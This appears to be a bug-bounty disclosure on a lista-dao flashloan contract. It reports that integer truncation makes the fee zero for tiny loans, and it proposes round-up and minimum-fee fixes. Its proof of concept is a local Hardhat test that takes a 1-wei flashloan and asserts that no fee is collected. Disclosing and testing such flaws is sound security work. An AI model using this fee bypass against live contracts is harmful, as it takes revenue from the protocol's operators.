## Title
Attacker can obtain flashloan with zero fee due to integer rounding.

## Brief/Intro
A rounding/truncation issue in the flashloan fee calculation allows borrowers to take very small flashloans that compute a fee of zero. Because there is no minimum borrow amount check, an attacker can repeatedly take tiny flashloans (or use FlashBuy which uses Flash) and avoid paying fees.

Affected components:
contracts/flash.sol — fee calculation at L100
contracts/FlashBuy.sol — uses the Flash contract and inherits the same exposure

## Vulnerability Details
Flash contract is as follows.
```solidity
File: flash.sol
088: 
089:     function flashFee(address token, uint256 amount) external override view returns (uint256) {
090:         require(token == address(hay), "Flash/token-unsupported");
091:         return (amount * toll) / WAD;
092:     }
093: 
094:     function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data) external override nonReentrant returns (bool) {
095:         require(token == address(hay), "Flash/token-unsupported");
096:         require(amount <= max, "Flash/ceiling-exceeded");
097:         require(vat.live() == 1, "Flash/vat-not-live");
098: 
099:         uint256 amt = amount * RAY;
100:         uint256 fee = (amount * toll) / WAD;   // @audit: There is a rounding error here!!!
101:         uint256 total = amount + fee;
102: 
103:         vat.suck(address(this), address(this), amt);
104:         hayJoin.exit(address(receiver), amount);
105: 
106:         emit FlashLoan(address(receiver), token, amount, fee);
107: 
108:         require(receiver.onFlashLoan(msg.sender, token, amount, fee, data) == CALLBACK_SUCCESS, "Flash/callback-failed");
109: 
110:         hay.safeTransferFrom(address(receiver), address(this), total);
111:         hayJoin.join(address(this), total);
112:         vat.heal(amt);
113: 
114:         return true;
115:     }
116: 
```
Let's see L100's code line.
The fee is computed with integer arithmetic and truncation, e.g.:
fee = amount * toll / 1e18
If amount * toll < 1e18, the result truncates to 0. 
For example with toll = 1e16 and amount = 10:
fee = 10 * 1e16 / 1e18 = 0

There is no minimum borrow amount or explicit requirement that fee > 0, so borrowers can request tiny amounts and pay no fee. That same Flash contract is used by FlashBuy.sol, so any caller of FlashBuy can also exploit this.


## Impact Details
I think Flashloan is very important feature in lista-dao project.
Normal usage of flashloan will give so many profit as a fee.
But this rounding error has the potential to result in the loss of this profit.
Repeated exploitation can cause meaningful protocol revenue loss.
Composability risks: dependent contracts (FlashBuy and any other integrations) inherit the vulnerability.

## Suggested fixes (recommended)
Round up the fee calculation to avoid zero fees for non-zero amounts:
```solidity
fee = (amount * toll + 1e18 - 1) / 1e18
```
(or use a mulDivRoundUp helper to avoid intermediate overflow)

Enforce a minimum fee or minimum borrow amount:
```solidity
require(fee > 0, "Flash: fee too small");
```
or

```solidity
require(amount >= MIN_BORROW, "Flash: amount below minimum");
```


## References
https://github.com/lista-dao/lista-dao-contracts/blob/fe130560674f579a3eaa45abdbc39790acb5d754/contracts/flash.sol#L100


## Proof of Concept
This is unit test code.
```
const { ethers, network } = require('hardhat');
const { expect } = require("chai");

describe('===Flash===', function () {
    let deployer, signer1, signer2;

    let wad = "000000000000000000", // 18 Decimals
        ray = "000000000000000000000000000", // 27 Decimals
        rad = "000000000000000000000000000000000000000000000"; // 45 Decimals

    let collateral = ethers.encodeBytes32String("TEST");

    beforeEach(async function () {

        [deployer, signer1, signer2] = await ethers.getSigners();

        // Contract factory
        this.Vat = await ethers.getContractFactory("Vat");
        this.Vow = await ethers.getContractFactory("Vow");
        this.Hay = await ethers.getContractFactory("Hay");
        this.HayJoin = await ethers.getContractFactory("HayJoin");
        this.Flash = await ethers.getContractFactory("Flash");
        this.BorrowingContract = await ethers.getContractFactory("FlashBorrower");

        // Contract deployment
        vat = await this.Vat.connect(deployer).deploy();
        await vat.waitForDeployment();
        vow = await this.Vow.connect(deployer).deploy();
        await vow.waitForDeployment();
        hay = await this.Hay.connect(deployer).deploy();
        await hay.waitForDeployment();
        hayjoin = await this.HayJoin.connect(deployer).deploy();
        await hayjoin.waitForDeployment();
        flash = await this.Flash.connect(deployer).deploy();
        await flash.waitForDeployment();
        borrowingContract = await this.BorrowingContract.connect(deployer).deploy(flash.target);
        await borrowingContract.waitForDeployment();
    });

    describe('--- flashLoan()', function () {
        it.only('flashloan without fee!!!', async function () {
            await vat.initialize();
            await vat.init(collateral);
            await vat.connect(deployer)["file(bytes32,uint256)"](await ethers.encodeBytes32String("Line"), "200" + rad);
            await vat.connect(deployer)["file(bytes32,bytes32,uint256)"](collateral, await ethers.encodeBytes32String("line"), "200" + rad);  
            await vat.connect(deployer)["file(bytes32,bytes32,uint256)"](collateral, await ethers.encodeBytes32String("dust"), "10" + rad);              
            await vat.connect(deployer)["file(bytes32,bytes32,uint256)"](collateral, await ethers.encodeBytes32String("spot"), "100" + ray);
            await vat.slip(collateral, deployer.address, "1" + wad);
            await vat.connect(deployer).frob(collateral, deployer.address, deployer.address, deployer.address, "1" + wad, 0);
            await vat.connect(deployer).frob(collateral, deployer.address, deployer.address, hayjoin.target, 0, "20" + wad);
            await vat.rely(flash.target);
            await vat.rely(hayjoin.target);

            await hay.initialize(97, "HAY", "100" + wad);
            await hay.rely(hayjoin.target);

            await hayjoin.initialize(vat.target, hay.target);
            await hayjoin.rely(flash.target);

            await flash.initialize(vat.target, hay.target, hayjoin.target, vow.target);
            await flash.connect(deployer)["file(bytes32,uint256)"](await ethers.encodeBytes32String("max"), "10" + wad);
            await flash.connect(deployer)["file(bytes32,uint256)"](await ethers.encodeBytes32String("toll"), "10000000000000000"); // 1%
            await hay.mint(borrowingContract.target, "1000000000000000000"); // Minting 1% fee that will be returned with 1 wad next
            await borrowingContract.flashBorrow(hay.target, "1");   // @audit: Attacker borrows a tiny amount of Hay!!(Not 1 wad but 1 wei)

            expect(await vat.hay(vow.target)).to.be.equal("0" + rad);
            await flash.accrue();
            expect(await vat.hay(vow.target)).to.be.equal("0");     // @audit: Vat.hay doesn't collect any fee from flash borrower!!
        });
    });
});
```

To run this test code, please run
```
npx run hardhat
```